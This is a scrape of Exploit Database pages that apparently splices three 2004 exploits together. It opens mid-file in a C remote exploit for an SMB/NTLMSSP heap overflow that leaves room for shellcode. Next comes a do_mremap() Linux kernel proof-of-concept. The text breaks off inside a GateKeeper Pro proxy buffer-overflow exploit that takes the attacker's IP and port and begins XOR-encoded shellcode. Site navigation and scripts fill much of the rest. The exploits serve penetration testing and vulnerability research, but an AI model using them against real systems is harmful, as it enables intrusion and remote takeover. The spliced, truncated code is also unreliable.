*/"\x81\x00\x00\x44""\x20\x45\x45\x45\x46\x45\x47\x45\x42\x46\x46\x45\x4D\x46\x45\x43""\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43""\x41\x00""\x20\x45\x45\x45\x46\x45\x47\x45\x42\x46\x46\x45\x4D\x46\x45\x43""\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x41""\x41\x00";/****************************************************************/unsigned char negotiate_req[] =/* NetBIOS Message Type + Length & SMB Header */"\x00\x00\x00\xB3""\xFF\x53\x4D\x42\x72\x00\x00\x00\x00\x08\x01\xC8\x00\x00\x00\x00""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x75\x03\x00\x00\x02\x00"/* Negotiate Protocol Request, actually sniffed from smbclient */"\x00\x90\x00\x02\x50\x43\x20\x4E\x45\x54\x57\x4F\x52\x4B\x20\x50""\x52\x4F\x47\x52\x41\x4D\x20\x31\x2E\x30\x00\x02\x4D\x49\x43\x52""\x4F\x53\x4F\x46\x54\x20\x4E\x45\x54\x57\x4F\x52\x4B\x53\x20\x31""\x2E\x30\x33\x00\x02\x4D\x49\x43\x52\x4F\x53\x4F\x46\x54\x20\x4E""\x45\x54\x57\x4F\x52\x4B\x53\x20\x33\x2E\x30\x00\x02\x4C\x41\x4E""\x4D\x41\x4E\x31\x2E\x30\x00\x02\x4C\x4D\x31\x2E\x32\x58\x30\x30""\x32\x00\x02\x44\x4F\x53\x20\x4C\x41\x4E\x4D\x41\x4E\x32\x2E\x31""\x00\x02\x53\x61\x6D\x62\x61\x00\x02\x4E\x54\x20\x4C\x41\x4E\x4D""\x41\x4E\x20\x31\x2E\x30\x00\x02\x4E\x54\x20\x4C\x4D\x20\x30\x2E""\x31\x32\x00";/****************************************************************/unsigned char setup_request[] =/* NetBIOS Message Type + Length & SMB Header */"\x00\x00\xCC\xCC""\xFF\x53\x4D\x42\x73\x00\x00\x00\x00\x08\x01\xC8\x00\x00\x00\x00""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x75\x03\x00\x00\x03\x00"/* Session Setup AndX Request */"\x0C\xFF\x00\x00\x00\xFF\xFF\x02\x00\x01\x00\x00\x00\x00\x00\xCC""\xCC\x00\x00\x00\x00\x5C\x00\x00\x80\xCC\xCC";/* Security Blob: SPNEGO OID + ASN.1 stuff */unsigned char security_blob[] =/* Application Constructed Object + SPNEGO OID */"\x60\x82\xCC\xCC\x06\x06\x2B\x06\x01\x05\x05\x02"/* negTokenInit + Constructed Sequence */"\xA0\x82\xCC\xCC\x30\x82\xCC\xCC"/* mechType: NTLMSSP OID */"\xA0\x0E\x30\x0C\x06\x0A\x2B\x06\x01\x04\x01\x82\x37\x02\x02\x0A"/* reqFlags that should trigger the overflow */"\xA1\x05\x23\x03\x03\x01\x07"/* mechToken: NTLMSSP (room for shellcode here) */"\xA2\x82\xCC\xCC\x04\x82\xCC\xCC""\x4E\x54\x4C\x4D\x53\x53\x50\x00\x01\x00\x00\x00\x15\x02\x08\x60""\x09\x00\x09\x00\x20\x00\x00\x00\x07\x00\x07\x00\x29\x00\x00\x00""\x57\x4F\x52\x4B\x47\x52\x4F\x55\x50\x44\x45\x46\x41\x55\x4C\x54";/* Native OS & LAN Manager */unsigned char other_stuff[] ="\x00\x55\x00\x6E\x00\x69\x00\x78\x00\x00\x00\x53\x00\x61\x00\x6D""\x00\x62\x00\x61\x00\x00\x00";/****************************************************************/int main( int argc, char *argv[] ){unsigned char buf[4096];struct hostent *server_host;struct sockaddr_in server_addr;int i, len, server_fd, n1, n2, n3;#ifdef WIN32WSADATA wsa;/* initialize windows sockets */if( WSAStartup( MAKEWORD(2,0), &wsa ) ){fprintf( stderr, "WSAStartup failed\n" );return( 1 );}#endifif( argc != 3 && argc != 4 ){fprintf( stderr, "usage: %s <target hostname> ""<port> [netbios name]\n",argv[0] );return( 1 );}/* resolve the server hostname and connect */server_host = gethostbyname( argv[1] );if( server_host == NULL ){fprintf( stderr, "gethostbyname(%s) failed\n", argv[1] );return( 1 );}memcpy( (void *) &server_addr.sin_addr,(void *) server_host->h_addr,server_host->h_length );sscanf( argv[2], "%d", &i );server_addr.sin_family = AF_INET;server_addr.sin_port   = htons( (unsigned short) i );server_fd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );if( server_fd < 0 ){fprintf( stderr, "could not create socket\n" );return( 1 );}len = sizeof( server_addr );if( connect( server_fd, (struct sockaddr *)&server_addr, len ) < 0 ){fprintf( stderr, "connect failed\n" );return( 1 );}if( argc == 4 ){/* encode the Called NetBIOS Name */len = sizeof( netbios_sess_req ) - 1;memcpy( buf, netbios_sess_req, len );memset( buf + 5, 'A', 32 );for( i = 0; i < (int) strlen( argv[3] ); i++ ){buf[5 + i * 2] += argv[3][i] >> 4;buf[6 + i * 2] += argv[3][i] & 15;}for( ; i < 16; i++ ){buf[5 + i * 2] += 0x20 >> 4;buf[6 + i * 2] += 0x20 & 15;}/* 1. NetBIOS Session Request */if( send( server_fd, buf, len, 0 ) != len ){fprintf( stderr, "send(NetBIOS Session Request) failed\n" );return( 1 );}if( recv( server_fd, buf, sizeof( buf ), 0 ) <= 0 ){fprintf( stderr, "recv(NetBIOS Session Response) failed\n" );return( 1 );}if( buf[0] == 0x83 ){fprintf( stderr, "NetBIOS Session rejected ""(wrong NetBIOS name ?)\n" );return( 1 );}}/* 2. Negotiate Protocol Request */len = sizeof( negotiate_req ) - 1;if( send( server_fd, negotiate_req, len, 0 ) != len ){fprintf( stderr, "send(Negotiate Protocol Request) failed\n" );return( 1 );}if( recv( server_fd, buf, sizeof( buf ), 0 ) <= 0 ){fprintf( stderr, "recv(Negotiate Protocol Response) failed\n" );return( 1 );}/* 3. Session Setup AndX Request */memset( buf, 'A', sizeof( buf ) );n1 = sizeof( setup_request ) - 1;n2 = sizeof( security_blob ) - 1;n3 = sizeof( other_stuff   ) - 1;memcpy( buf,           setup_request, n1 );memcpy( buf + n1,      security_blob, n2 );n2 += 2000; /* heap padding for shellcode */memcpy( buf + n1 + n2, other_stuff,   n3 );len = n1 + n2 + n3;buf[ 2] = ( ( len - 4 ) >> 8 ) & 0xFF;      /* NetBIOS msg length   */buf[ 3] = ( ( len - 4 )      ) & 0xFF;buf[51] = ( n2      ) & 0xFF;               /* Security Blob Length */buf[52] = ( n2 >> 8 ) & 0xFF;buf[61] = ( ( n2 + n3 )      ) & 0xFF;      /* Byte Count (BCC)     */buf[62] = ( ( n2 + n3 ) >> 8 ) & 0xFF;buf[n1 +  2] = ( ( n2 -  4 ) >> 8 ) & 0xFF; /* ACO Length           */buf[n1 +  3] = ( ( n2 -  4 )      ) & 0xFF;buf[n1 + 14] = ( ( n2 - 16 ) >> 8 ) & 0xFF; /* negTokenInit Length  */buf[n1 + 15] = ( ( n2 - 16 )      ) & 0xFF;buf[n1 + 18] = ( ( n2 - 20 ) >> 8 ) & 0xFF; /* Constr. Seq. Length  */buf[n1 + 19] = ( ( n2 - 20 )      ) & 0xFF;buf[n1 + 45] = ( ( n2 - 47 ) >> 8 ) & 0xFF; /* mechToken Length     */buf[n1 + 46] = ( ( n2 - 47 )      ) & 0xFF;buf[n1 + 49] = ( ( n2 - 51 ) >> 8 ) & 0xFF; /* String Length        */buf[n1 + 50] = ( ( n2 - 51 )      ) & 0xFF;if( send( server_fd, buf, len, 0 ) != len ){fprintf( stderr, "send(Session Setup AndX Request) failed\n" );return( 1 );}recv( server_fd, buf, sizeof( buf ), 0 );shutdown( server_fd, 2 );return( 0 );}// milw0rm.com [2004-02-14]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 154
Linux Kernel 2.2.25/2.4.24/2.6.2 - 'mremap()' Validator - Linux local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDLinux Kernel 2.2.25/2.4.24/2.6.2 - 'mremap()' ValidatorEDB-ID:154CVE:2004-0077EDB Verified:Author:Christophe DevineType:localExploit:/Platform:LinuxDate:2004-02-18Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/**  Proof-of-concept exploit code for do_mremap() #2** EDB Note: This is NOT to be confused with CVE-2003-0985 // https://www.exploit-db.com/exploits/141/, which would be "do_mremap() #1".* EDB Note: This will just "test" the vulnerability. A exploit version can be found here ~ https://www.exploit-db.com/exploits/160/***  Copyright (C) 2004  Christophe Devine**  This program is free software; you can redistribute it and/or modify*  it under the terms of the GNU General Public License as published by*  the Free Software Foundation; either version 2 of the License, or*  (at your option) any later version.**  This program is distributed in the hope that it will be useful,*  but WITHOUT ANY WARRANTY; without even the implied warranty of*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the*  GNU General Public License for more details.**  You should have received a copy of the GNU General Public License*  along with this program; if not, write to the Free Software*  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA*/#include <asm/unistd.h>#include <sys/mman.h>#include <unistd.h>#include <stdio.h>#include <errno.h>#define MREMAP_MAYMOVE  1#define MREMAP_FIXED    2#define MREMAP_FLAGS  MREMAP_MAYMOVE | MREMAP_FIXED#define __NR_real_mremap __NR_mremapstatic inline _syscall5( void *, real_mremap, void *, old_address,size_t, old_size, size_t, new_size,unsigned long, flags, void *, new_address );#define VMA_SIZE 0x00003000int main( void ){int i, ret;void *base0;void *base1;i = 0;while( 1 ){i++;ret = (int) mmap( (void *)( i * (VMA_SIZE + 0x1000) ),VMA_SIZE, PROT_READ | PROT_WRITE,MAP_PRIVATE | MAP_ANONYMOUS, 0, 0 );if( ret == -1 ){perror( "mmap" );break;}base0 = base1;base1 = (void *) ret;}printf( "created ~%d VMAs\n", i );base0 += 0x1000;base1 += 0x1000;printf( "now mremapping 0x%08X at 0x%08X\n",(int) base1, (int) base0 );real_mremap( base1, 4096, 4096, MREMAP_FLAGS, base0 );printf( "kernel may not be vulnerable\n" );return( 0 );}// milw0rm.com [2004-02-18]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 155
Proxy-Pro Professional GateKeeper Pro 4.7 - Web proxy Remote Buffer Overflow - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDProxy-Pro Professional GateKeeper Pro 4.7 - Web proxy Remote Buffer OverflowEDB-ID:155CVE:2004-0326EDB Verified:Author:kralorType:remoteExploit:/Platform:WindowsDate:2004-02-26Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*================[CRPT - FrenchTeam] =================*[Coromputer Security Advisory] - [CRPTSA-01]*=================== [Summary] =====================*Software : GateKeeper Pro 4.7Platforms : win32Risk : HighImpact : Buffer overflowRelease Date : 2004-02-23*=================== [Description] ====================*there is a trivial buffer overflow in the web proxy (default port 3128).*==================== [Details] ======================*Sending GET http://host.com/AAAAAAAAAA...(~4100bytes) will cause an accessviolation. Other services not tested, but they can be vulnerable too. Exactversion can be checked from the administration service (default port 2000).*==================== [Exploits] ======================*/****************************************************//* [Crpt]    GateKeeper Pro 4.7 remote sploit by kralor    [Crpt]  *//****************************************************//* bug discovered & coded by: kralor [from coromputer]            *//* tested on: win2k pro and winXP                                          *//* it uses a static offset to hijack execution to the shellcode..    *//* so it is 100% universal. Nothing more to say..                      *//****************************************************//*informations: www coromputer net irc undernet #coromputer    *//****************************************************/#include <stdio.h>#include <stdlib.h>#include <windows.h>#include <winsock.h>#pragma comment (lib,"ws2_32")#define PORT 3128#define ADMIN_PORT 2000#define VERSION "4.7.0"#define RET_POS 4079#define SIZE 4105#define RET_ADDR 0x03b1e121#define REQ  "GET http://www.microsoft.com/"#define REQ2 "\r\nHost: www.microsoft.com\r\n\r\n"// sequence of 4 opcodes#define HOP 0xd4 // host opcode#define POP 0xd7 // port opcodeint cnx(char *host, int port){int sock;struct sockaddr_in yeah;struct hostent *she;sock=socket(AF_INET,SOCK_STREAM,0);if(!sock) {printf("error: unable to create socket\r\n");return 0;}yeah.sin_family=AF_INET;yeah.sin_addr.s_addr=inet_addr(host);yeah.sin_port=htons((u_short)port);if((she=gethostbyname(host))!=NULL) {memcpy((char *)&yeah.sin_addr,she->h_addr,she->h_length);} else {if((yeah.sin_addr.s_addr=inet_addr(host))==INADDR_NONE) {printf("error: cannot resolve host\r\n");return 0;}}printf("[+] Connecting to %-30s ...",host);if(connect(sock,(struct sockaddr*)&yeah,sizeof(yeah))!=0) {printf("error: connection refused\r\n");return 0;}printf("Done\r\n");return sock;}void banner(void){printf("\r\n\t  [Crpt] GateKeeper Pro 4.7 remote sploit by kralor [Crpt]\r\n");printf("\t\t www.coromputer.net && undernet #coromputer\r\n\r\n");return;}void syntax(char *prog){printf("syntax: %s <host> <your_ip> <your_port>\r\n",prog);exit(0);}int main(int argc, char *argv[]){WSADATA wsaData;int sock;char buffer[1024],useme[SIZE],*ptr;unsigned long host,port;unsigned int i;char shellc0de[] =   /* sizeof(shellc0de+xorer) == 332 bytes *//* classic xorer */"\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x5b\x80\xc3\x10\x33\xc9\x66""\xb9\x33\x01\x80\x33\x95\x43\xe2\xfa"/* shellc0de 